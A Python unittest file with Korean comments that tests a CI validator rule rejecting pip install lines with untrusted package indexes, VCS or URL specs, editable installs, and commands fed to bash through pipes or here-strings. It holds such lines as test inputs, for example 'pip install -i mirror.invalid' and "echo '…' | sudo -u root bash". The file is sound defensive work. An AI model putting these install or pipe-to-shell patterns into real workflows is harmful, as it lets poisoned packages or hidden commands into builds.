        self.assertEqual(self.unreadable("echo '{h}' | sudo -u root bash")[1], [])


# ----------------------------------------------------------------------------
# 3) 워크플로 설치 줄 — 임시 폴더에서 한 곳씩 틀리게
# ----------------------------------------------------------------------------
@NEEDS_YAML
class InstallLineTest(unittest.TestCase):
    HEAD = ("name: w\non: push\njobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/setup-python@v6\n        with:\n          python-version: '3.12'\n      - run: |\n")

    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        self.root = Path(self._tmp.name)
        for rel, data in FILE_SOURCES.items():
            self.write(rel, data.decode("utf-8"))

    def write(self, rel, text):
        path = self.root / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_bytes(text.encode("utf-8"))

    def found(self, *lines):
        self.write(".github/workflows/w.yml", self.HEAD + "".join("          " + line + "\n" for line in lines))
        listing = sorted(path.relative_to(self.root).as_posix() for path in self.root.rglob("*") if path.is_file())
        return vr.check_dependency_constraints(self.root, listing)

    def errors(self, *lines):
        return [f for f in self.found(*lines) if f.check == "DEP-3" and f.level == "ERROR"]

    def test_the_untouched_line_is_clean_so_every_red_below_comes_from_its_own_change(self):
        self.assertEqual([f.line() for f in self.found(GOOD)], [])

    def test_each_source_option_on_an_otherwise_good_line_is_one_error_naming_it(self):
        for option, name in (("--index-url mirror.invalid", "--index-url"), ("--pypi-url mirror.invalid", "--pypi-url"), ("-i mirror.invalid", "-i"), ("--extra-index-url mirror.invalid", "--extra-index-url"), ("-f mirror.invalid", "-f"),
                             ("--find-links mirror.invalid", "--find-links"), ("--trusted-host mirror.invalid", "--trusted-host"), ("--index-url=mirror.invalid", "--index-url"), ("-imirror.invalid", "-i"),
                             ("--extra-index=mirror.invalid", "--extra-index"), ("--trusted mirror.invalid", "--trusted"), ("-qi mirror.invalid", "-i")):
            with self.subTest(option=option):
                found = self.errors(GOOD + " " + option)
                mine = [f for f in found if "받아 오는 곳" in f.message]
                extra = [f for f in found if "받아 오는 곳" not in f.message]
                self.assertEqual(len(mine), 1, [f.line() for f in found])
                self.assertIn(f"`{name}`", mine[0].message)
                self.assertEqual(mine[0].path, ".github/workflows/w.yml")
                for text in (mine[0].message, mine[0].line()):
                    self.assertEqual(len(text.splitlines()), 1, text)
                    self.assertNotIn("::", text)
                # 옛 읽기 목록(`_DEP3_VALUE_OPTIONS` — 이 변경이 건드리지 않는다)이 값 옵션으로 모르는 철자(별칭·줄임말·합친 짧은 옵션)는 뒤따르는 값이 패키지 이름으로도 읽혀
                # '요구 패키지가 constraints 에 없다' 는 오류가 하나 더 붙는다 — 줄은 어차피 오류이고 받아 오는 곳 오류는 정확히 하나다. 아는 철자에는 덧붙는 오류가 없다.
                if option.split()[0] in ("--pypi-url", "--trusted", "-qi"):
                    self.assertLessEqual(len(extra), 1, [f.line() for f in extra])
                    self.assertTrue(all("요구 패키지" in f.message for f in extra), [f.line() for f in extra])
                else:
                    self.assertEqual(extra, [], [f.line() for f in extra])

    def test_two_or_more_source_options_on_one_line_are_one_error_each_in_the_order_they_appear(self):
        """시험 렌즈 Q 의 Q46: 한 줄에 색인 옵션이 둘 이상이어도 첫 번째만 알리면 옛 시험이 모두 통과했다(리더 시험은 낱말 목록만 봤다) — 옵션마다 오류 하나, 줄에 나온 차례대로."""
        found = self.errors(GOOD + " -i a --extra-index-url b")
        self.assertEqual(len(found), 2, [f.line() for f in found])
        self.assertIn("`-i`", found[0].message)
        self.assertIn("`--extra-index-url`", found[1].message)
        four = self.errors(GOOD + " -i a --extra-index-url b -f c --trusted-host d")
        self.assertEqual(len(four), 4, [f.line() for f in four])
        for finding, name in zip(four, ("`-i`", "`--extra-index-url`", "`-f`", "`--trusted-host`")):
            self.assertIn(name, finding.message)
        before = self.errors("python -m pip --trusted-host h install -c constraints-py312.txt -r requirements-edits.txt -f c")                 # install 앞과 뒤에 하나씩
        self.assertEqual([("`--trusted-host`" in f.message, "`-f`" in f.message) for f in before], [(True, False), (False, True)])

    def test_the_option_before_install_counts_too(self):
        found = self.errors("python -m pip --trusted-host mirror.invalid install -c constraints-py312.txt -r requirements-edits.txt")
        self.assertEqual(len(found), 1)
        self.assertIn("`--trusted-host`", found[0].message)

    def test_the_pip_only_line_is_not_exempt_because_a_poisoned_pip_poisons_every_install_after_it(self):
        """`pip install --upgrade pip` 은 `-c` 가 필요 없는 줄이지만(옛 규칙), 거기에 색인 옵션이 붙으면 pip 자신이 다른 곳에서 와서 그 뒤의 모든 설치를 믿을 수 없다."""
        self.assertEqual([f.line() for f in self.found("python -m pip install --upgrade pip")], [])
        for option in ("--index-url mirror.invalid", "-i mirror.invalid", "--extra-index-url mirror.invalid", "-f mirror.invalid", "--trusted-host mirror.invalid"):
            with self.subTest(option=option):
                self.assertEqual(len(self.errors("python -m pip install --upgrade pip " + option)), 1)

    def test_each_source_option_is_an_error_even_when_the_line_has_no_constraints_file(self):
        for option in ("--index-url mirror.invalid", "-f mirror.invalid"):
            with self.subTest(option=option):
                found = self.errors("python -m pip install -r requirements-edits.txt " + option)
                self.assertTrue(any("받아 오는 곳" in f.message for f in found), [f.line() for f in found])
                self.assertTrue(any("-c 가 없습니다" in f.message for f in found), [f.line() for f in found])            # 옛 오류도 그대로 있다

    def test_python_and_pip_spellings_and_wrapping_are_all_read(self):
        for line in ("pip install -c constraints-py312.txt -r requirements-edits.txt -i mirror.invalid", "pip3 install -c constraints-py312.txt -r requirements-edits.txt -f mirror.invalid",
                     "python3 -m pip install -c constraints-py312.txt -r requirements-edits.txt --index-url mirror.invalid", "python -mpip install -c constraints-py312.txt -r requirements-edits.txt -i mirror.invalid",
                     "FOO=1 pip install -c constraints-py312.txt -r requirements-edits.txt -i mirror.invalid", "if true; then pip install -c constraints-py312.txt -r requirements-edits.txt -i mirror.invalid; fi",
                     "pip install -c constraints-py312.txt -r requirements-edits.txt -i mirror.invalid 2>&1 | tail -3", "pip install \\\n  -c constraints-py312.txt \\\n  -r requirements-edits.txt \\\n  -i mirror.invalid"):
            with self.subTest(line=line):
                self.assertEqual(len(self.errors(*line.split("\n"))), 1)

    def test_source_specs_are_one_error_each_with_and_without_a_constraints_file(self):
        for spec in ("git+https://example.invalid/x.git", "https://example.invalid/x-1.0.whl", "pkg@https://example.invalid/pkg.whl", "hg+https://example.invalid/x", "git+ssh://example.invalid/x.git"):
            for prefix in ("python -m pip install -c constraints-py312.txt ", "python -m pip install "):
                with self.subTest(spec=spec, prefix=prefix):
                    found = [f for f in self.errors(prefix + spec) if "주소·VCS" in f.message]
                    self.assertEqual(len(found), 1, [f.line() for f in self.errors(prefix + spec)])
                    self.assertIn(spec.split("://")[0] if "://" in spec else "pkg@", found[0].message)

    def test_a_source_spec_is_reported_once_not_again_by_the_older_unreadable_requirement_message(self):
        found = self.errors("python -m pip install -c constraints-py312.txt git+https://example.invalid/x.git")
        self.assertEqual(len(found), 1, [f.line() for f in found])

    def test_editable_installs_are_errors_in_every_spelling_with_or_without_a_constraints_file(self):
        for line in ("-e .", "--editable .", "-e.", "--editable=.", "-e git+https://example.invalid/x.git#egg=x", "-r requirements-edits.txt -e ."):
            for prefix in ("python -m pip install -c constraints-py312.txt ", "python -m pip install "):
                with self.subTest(line=line, prefix=prefix):
                    found = [f for f in self.errors(prefix + line) if "`-e`" in f.message]
                    self.assertEqual(len(found), 1, [f.line() for f in self.errors(prefix + line)])

    def test_a_line_whose_targets_are_all_addresses_still_gets_its_constraints_errors(self):
        """독립 검증 S 의 N6: 설치 대상이 전부 주소·VCS 인 줄은 `named` 가 비어 같은 줄의 `-c` 검사를 건너뛰었다 — 주소 오류 하나에 -c 없음·번호 어긋남 오류가 가려졌다(기준 e39f0e2 는 둘 다 냈다)."""
        url = "pkg@https://example.invalid/pkg.whl"
        for line, needles in ((f"python -m pip install {url}", ("-c 가 없습니다",)),
                              (f"python -m pip install -c constraints-py999.txt {url}", ("constraints-py312.txt 여야 합니다",)),
                              ("python -m pip install git+https://example.invalid/x.git", ("-c 가 없습니다",)),
                              (f"python -m pip install -c ${{X}} {url}", ("-c 의 값 `${X}`",)),
                              (f"python -m pip install --upgrade pip {url}", ("-c 가 없습니다",)),
                              (f"python -m pip install -c constraints-py312.txt {url}", ())):
            with self.subTest(line=line):
                found = self.errors(line)
                self.assertEqual(len([f for f in found if "주소·VCS" in f.message]), 1, [f.line() for f in found])
                for needle in needles:
                    self.assertEqual(len([f for f in found if needle in f.message]), 1, (needle, [f.line() for f in found]))
                self.assertEqual(len(found), 1 + len(needles), [f.line() for f in found])
        self.assertEqual(self.errors("python -m pip install --upgrade pip"), [])                    # pip 자신만 올리는 줄은 그대로 면제

    def test_the_old_errors_are_kept_for_lines_with_no_source_option(self):
        self.assertIn("-c 가 없습니다", " ".join(f.message for f in self.errors("python -m pip install -r requirements-edits.txt")))
        self.assertIn("constraints-py312.txt 여야 합니다", " ".join(f.message for f in self.errors("python -m pip install -c constraints-py310.txt -r requirements-edits.txt")))

    def test_message_text_that_only_mentions_the_option_is_not_an_install(self):
        self.assertEqual([f.line() for f in self.found(GOOD, 'echo "pip install --index-url mirror.invalid"', 'git commit -m "docs: pip install -i note" --allow-empty')], [])

    def test_the_other_installers_and_pip_commands_stay_outside_as_the_document_says(self):
        """문서가 '이 규칙이 보지 않는다' 고 적은 길 — 환경 변수로 색인 바꾸기·`pip config set`·`pip download`/`pip wheel` 줄·`pipx`. 막는 변경이 생기면 시험과 문서를 함께 고친다."""
        for line in ("PIP_INDEX_URL=mirror.invalid " + GOOD, "python -m pip config set global.extra-index-url mirror.invalid", "python -m pip download --index-url mirror.invalid pyyaml",
                     "python -m pip wheel -i mirror.invalid pyyaml", "pipx install ruff"):
            with self.subTest(line=line):
                self.assertEqual([f.line() for f in self.found(GOOD, line)], [], line)

    def test_a_pip_line_hidden_in_a_nested_shell_is_still_the_older_unreadable_error(self):
        found = self.errors('bash -c "pip install -i mirror.invalid -r requirements-edits.txt"')
        self.assertEqual(len(found), 1)
        self.assertIn("읽지 못하는 모양", found[0].message)

    def test_a_pip_install_line_hidden_as_shell_input_is_an_unreadable_error_in_a_workflow_too(self):
        """독립 검증 S 의 R3: `bash <<< "…"`·`echo '…' | bash`·`printf '…' | sh` 로 설치 줄을 감추면 기준(e39f0e2)은 오류 0 이었다 — 이제 셸이 입력을 받는 줄 모양 자체가 DEP-3 오류(읽지 못한 모양)다."""
        for line in ('bash <<< "{h}"', "bash -s <<< '{h}'", "echo '{h}' | bash", "printf '{h}\\n' | sh", "echo '{h}' | zsh", "echo '{h}' | dash", "sudo bash <<< '{h}'", "echo '{h}' | sudo bash -s"):
            with self.subTest(line=line):
                found = self.errors(GOOD, line.replace("{h}", HIDDEN))
                self.assertEqual(len(found), 1, [f.line() for f in found])
                self.assertIn("읽지 못하는 모양", found[0].message)
                self.assertIn("셸이 실행하는 줄", found[0].message)
                self.assertEqual(found[0].path, ".github/workflows/w.yml")
                for text in (found[0].message, found[0].line()):
                    self.assertEqual(len(text.splitlines()), 1, text)
                    self.assertNotIn("::", text)
        self.assertEqual([f.line() for f in self.found(GOOD, "echo ok | tee out.log", "read -r a <<< \"$HOME\"", "bash script.sh")], [])        # 셸이 입력을 받지 않는 줄은 그대로 통과


# ----------------------------------------------------------------------------
# 4) 진짜 저장소 — 새 규칙이 거절하는 곳 0
# ----------------------------------------------------------------------------
@NEEDS_YAML
class RealRepositoryTest(unittest.TestCase):
    def test_the_real_repository_has_no_dep3_finding(self):
        self.assertEqual([f.line() for f in vr.check_dependency_constraints(ROOT, vr.list_files(ROOT))], [])

    def test_every_real_install_line_was_read_and_none_has_a_source_option_or_a_source_spec_or_dash_e(self):
        installs = 0
        for path in sorted((ROOT / ".github" / "workflows").glob("*.yml")):
            data = yaml.safe_load(path.read_bytes().decode("utf-8"))
            for job in (data.get("jobs") or {}).values():
                for step in job.get("steps") or []:
                    if isinstance(step.get("run"), str):
                        found, unreadable = vr._dep3_pip_installs(step["run"])
                        self.assertEqual(unreadable, [], path.name)
                        for install in found:
                            installs += 1
                            self.assertEqual(install["sources"], [], (path.name, install["text"]))
                            self.assertEqual([spec for spec in install["specs"] if vr._dep3_source_spec(spec)], [], (path.name, install["text"]))
                            self.assertEqual(install["editable"], [], (path.name, install["text"]))
        self.assertGreaterEqual(installs, 10)                                    # 설치 줄 10곳(+ pip 자신을 올리는 줄들)을 실제로 읽었다 — 비어서 통과하지 않는다


# ----------------------------------------------------------------------------
# 5) 문서
# ----------------------------------------------------------------------------
class DocsTest(unittest.TestCase):
    DOC = (ROOT / "docs" / "DEPENDENCY_PINNING.md").read_bytes().decode("utf-8").replace("\r\n", "\n")

    def test_the_rule_list_has_the_new_item_and_the_options_it_rejects(self):
        section = self.DOC[self.DOC.index("## 3."):self.DOC.index("## 4.")]
        item = section[section.index("5. **"):section.index("**새 모양만 허용**")]
        for word in ("--index-url", "-i", "--extra-index-url", "-f", "--find-links", "--trusted-host", "git+", "-e", "pip", "--upgrade pip", "오류"):
            self.assertIn(word, item, word)

    def test_the_shapes_that_still_pass_are_named_honestly_and_the_rejected_ones_are_not_listed_as_passing(self):
        paragraph = self.DOC[self.DOC.index("오류도 없이 지나가는 모양"):self.DOC.index("## 4.")]
        for word in ("pip config set", "PIP_INDEX_URL", "PIP_EXTRA_INDEX_URL", "PIP_FIND_LINKS", "PIP_TRUSTED_HOST", "설정 파일", "pip download", "승인 범위 밖", "이제 오류"):
            self.assertIn(word, paragraph, word)
        self.assertNotIn("-c` 만 맞으면 지나갑니다", paragraph)                   # 옛 문장('색인 옵션은 -c 만 맞으면 지나간다')이 남아 있지 않다
        self.assertNotIn("색인 옵션을 거절하는 규칙은 승인 범위 밖이라 두지 않았고", paragraph)

    def test_the_limits_paragraph_says_what_the_option_check_does_not_read(self):
        limits = self.DOC[self.DOC.index("**한계**:"):self.DOC.index("**오류도 없이 지나가는 모양**")]
        for word in ("낱말", "환경 변수", "설정 파일", "pip download"):
            self.assertIn(word, limits, word)

    def test_the_shell_input_rule_the_here_string_reading_the_n6_line_and_the_new_limit_h_are_in_the_document(self):
        """독립 검증 S 의 R3·N6 문서 줄을 못박는다 — 규칙(새 모양만 허용)·here-string 글 읽기(한계)·N6(5번)·못 막는 모양 (h)."""
        section = self.DOC[self.DOC.index("## 3."):self.DOC.index("## 4.")]
        item = section[section.index("5. **"):section.index("**새 모양만 허용**")]
        self.assertIn("설치 대상이 전부 주소인 줄도 같은 줄의 `-c` 없음·번호 어긋남 오류를 가리지 않고 함께 냅니다", item)
        allowed = section[section.index("**새 모양만 허용**"):section.index("**한계**:")]
        for word in ("셸이 파이프·here-string 으로 받은 글을 실행하는 줄", "echo '…' | bash", "printf '…' | sh", "bash <<< '…'", "bash -s <<< …", "입력에 pip install 이 있든 없든 오류입니다", "R3"):
            self.assertIn(word, allowed, word)
        limits = section[section.index("**한계**:"):section.index("**오류도 없이 지나가는 모양**")]
        self.assertIn("`<<<` 뒤의 here-string 글도 인자와 같게 읽습니다", limits)
        passing = section[section.index("**오류도 없이 지나가는 모양**"):]
        for word in ("(h) 다른 언어의 코드 안에서 pip 부르기와 감싸는 명령의 옵션 값", "python -c", "python - <<<", "sudo -u 사용자 bash", "env -C 폴더 bash", "지금 저장소의 워크플로에는 둘 다 없습니다"):
            self.assertIn(word, passing, word)

    def test_the_defect_row_and_the_guardrail_row_name_the_second_round_changes(self):
        register = (ROOT / "docs" / "DEFECT_REGISTER.md").read_bytes().decode("utf-8").replace("\r\n", "\n")
        row = next(line for line in register.split("\n") if line.startswith("| **D-495** |"))
        self.assertEqual(row.count("|"), 7)
        for word in ("독립 검증 S 의 R3·N6", "bash <<< \"…\"", "파이프로 `bash`·`sh` 에 먹이는 줄", "읽지 못한 모양(DEP-3 오류)", "`sudo -u 사용자 bash`", "§3 (h)", "constraints-py999.txt", "둘 다 낸다"):
            self.assertIn(word, row, word)
        guardrails = (ROOT / "docs" / "SECURITY_GUARDRAILS.md").read_bytes().decode("utf-8").replace("\r\n", "\n")
        dep3 = next(line for line in guardrails.split("\n") if line.startswith("| DEP-3 |"))
        self.assertEqual(len(re.findall(r"(?<!\\)\|", dep3)), 4)                                  # 표 한 줄 = 칸 셋 — 글 안에 파이프 글자를 그대로 쓰면 칸이 깨진다
        for word in ("셸이 파이프·here-string 으로 받은 글을 실행하는 줄", "파이프로 `bash` 에 먹이는 줄", "독립 검증 S 의 R3"):
            self.assertIn(word, dep3, word)

    def test_the_document_stays_free_of_liquid_tilde_and_links(self):
        for forbidden in ("{{", "{%", "~", "http://", "https://"):
            self.assertNotIn(forbidden, self.DOC, forbidden)

    def test_the_defect_row_and_the_guardrail_rows_are_there_once(self):
        register = (ROOT / "docs" / "DEFECT_REGISTER.md").read_bytes().decode("utf-8").replace("\r\n", "\n")
        rows = [line for line in register.split("\n") if line.startswith("| **D-495** |")]
        self.assertEqual(len(rows), 1)
        for word in ("DEP-3", "--index-url", "pip 자신", "test_dependency_sources.py", "D-483"):
            self.assertIn(word, rows[0], word)
        for forbidden in ("{{", "~", "http://", "https://"):
            self.assertNotIn(forbidden, rows[0], forbidden)
        guardrails = (ROOT / "docs" / "SECURITY_GUARDRAILS.md").read_bytes().decode("utf-8").replace("\r\n", "\n")
        row = next(line for line in guardrails.split("\n") if line.startswith("| DEP-3 |"))
        self.assertIn("색인", row)
        self.assertIn("G-A5", row)


if __name__ == "__main__":
    unittest.main()
